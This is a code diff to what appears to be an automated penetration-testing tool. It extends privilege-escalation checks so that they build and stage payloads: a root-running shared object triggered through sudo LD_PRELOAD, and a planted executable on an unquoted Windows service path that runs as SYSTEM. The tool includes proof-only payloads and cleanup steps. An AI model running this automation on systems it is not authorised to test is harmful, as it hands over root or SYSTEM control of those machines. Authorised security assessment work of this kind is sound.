@@ -46,8 +46,9 @@ class Vector:
     #: (arsenal_name, remote_path) artifacts this vector needs on the target — the loop
     #: auto-stages these from the arsenal and retries when the target reports them missing.
     stages: tuple = ()
-    #: (format, remote_path) artifacts fieldkit *builds* (see fieldkit.poc) then stages —
-    #: the loop builds+pushes these on a miss, and rebuilds corrected on a BAD_BUILD.
+    #: (format, remote_path, build_command) artifacts fieldkit *builds* (see fieldkit.poc)
+    #: then stages — the loop builds+pushes these on a miss, rebuilds corrected on a
+    #: BAD_BUILD. ``build_command`` is what the built artifact runs (None → poc's proof).
     builds: tuple = ()
 
     @property
@@ -351,17 +352,29 @@ def _d_docker_group(facts, ctx):
 
 
 def _d_sudo_env(facts, ctx):
-    if facts.sudo_env_keep & {"LD_PRELOAD", "LD_LIBRARY_PATH"}:
-        which = ", ".join(sorted(facts.sudo_env_keep & {"LD_PRELOAD", "LD_LIBRARY_PATH"}))
-        yield Vector(
-            key="sudo:env-preload", title=f"sudo preserves {which} → root",
-            exploitability="high", safety="config-change", detection="moderate",
-            command="# build a .so whose constructor setuid(0)+execs, then: sudo LD_PRELOAD=/tmp/p.so <allowed-cmd>",
-            shell="sh", host=ctx.host,
-            detail=f"sudo keeps {which}; preload a .so that runs as root before an allowed command.",
-            evidence=f"sudo -l: env_keep+={which}",
-            safe_proof="prove with a .so that only runs `id`; remove /tmp/p.so after.",
-            cleanup="rm -f /tmp/p.so", report_type="ld_preload")
+    preload = facts.sudo_env_keep & {"LD_PRELOAD", "LD_LIBRARY_PATH"}
+    if not preload:
+        return
+    which = ", ".join(sorted(preload))
+    so = f"{ctx.stage_lin}/p.so"
+    allowed = sorted(facts.sudo_binaries)
+    if allowed:
+        # a concrete allowed sudo command to trigger the preload; the .so's constructor
+        # runs `id` as root first and that output is captured — a real one-shot proof.
+        cmd, builds = allowed[0], (("so", so, "id"),)
+        command = f"sudo LD_PRELOAD={so} {cmd}"
+        detail = f"sudo keeps {which}; a root .so preloaded before the allowed `{cmd}`."
+    else:
+        cmd, builds = None, ()
+        command = f"# stage a root .so at {so}, then: sudo LD_PRELOAD={so} <an-allowed-cmd>"
+        detail = f"sudo keeps {which}; preload a root .so before any allowed sudo command."
+    yield Vector(
+        key="sudo:env-preload", title=f"sudo preserves {which} → root",
+        exploitability="high", safety="config-change", detection="moderate",
+        command=command, shell="sh", host=ctx.host, detail=detail,
+        evidence=f"sudo -l: env_keep+={which}",
+        safe_proof="the preloaded .so runs `id` as root before the command; remove it after.",
+        cleanup=f"rm -f {so}", report_type="ld_preload", builds=builds)
 
 
 def _d_win_privs(facts, ctx):
@@ -396,22 +409,37 @@ def _d_win_aie(facts, ctx):
             evidence="AlwaysInstallElevated=0x1 in HKLM and HKCU",
             safe_proof="build the msi to run `whoami`/add an admin; a SYSTEM whoami proves it.",
             cleanup=f"del {stage}\\evil.msi", report_type="alwaysinstallelevated",
-            builds=(("msi", f"{stage}\\evil.msi"),))
+            builds=(("msi", f"{stage}\\evil.msi", None),))
 
 
 def _d_win_unquoted(facts, ctx):
-    for _, path in facts.unquoted_services:
-        # the first space-truncated candidate Windows would try
+    stage = ctx.stage_win
+    for name, path in facts.unquoted_services:
+        # the first space-truncated candidate Windows would try to run
         candidate = path.split(" ", 1)[0] + ".exe"
+        if name:
+            # plant a payload exe that writes its (SYSTEM) identity, restart the service
+            # to trigger it, then read the proof back. On the first fire the file is
+            # absent (`type` → not found → the loop builds+plants the exe), on the retry
+            # the restarted service ran it as SYSTEM.
+            proof = f"{stage}\\up.txt"
+            builds = (("exe", candidate, f"cmd /c whoami > {proof}"),)
+            command = (f"sc stop {name} & sc start {name} & ping -n 4 127.0.0.1 >nul "
+                       f"& type {proof}")
+            cleanup = f"del {candidate} & del {proof}"
+            detail = (f"unquoted service path {path!r} — plant an exe at {candidate}, "
+                      f"restart {name}; it runs as SYSTEM.")
+        else:
+            builds, cleanup = (), f"del {candidate}"
+            command = f"REM plant a payload at {candidate}, then: sc stop <svc> & sc start <svc>"
+            detail = f"unquoted service path {path!r} — plant an exe at the first writable candidate."
         yield Vector(
-            key=f"unquoted:{path}", title="unquoted service path → SYSTEM",
+            key=f"unquoted:{path}", title=f"unquoted service path ({name or '?'}) → SYSTEM",
             exploitability="medium", safety="config-change", detection="moderate",
-            command=f"REM plant a payload at {candidate}, then: sc stop <svc> & sc start <svc>",
-            shell="cmd", host=ctx.host,
-            detail=f"unquoted service path {path!r} — plant an exe at the first writable candidate.",
+            command=command, shell="cmd", host=ctx.host, detail=detail,
             evidence=f"unquoted service path: {path}",
             safe_proof="check icacls on the candidate's parent dir for a writable ACL first.",
-            cleanup=f"del {candidate}")
+            cleanup=cleanup, report_type="unquoted_service", builds=builds)
 
 
 #: OS -> the drivers that apply. Append to extend the knowledge base.
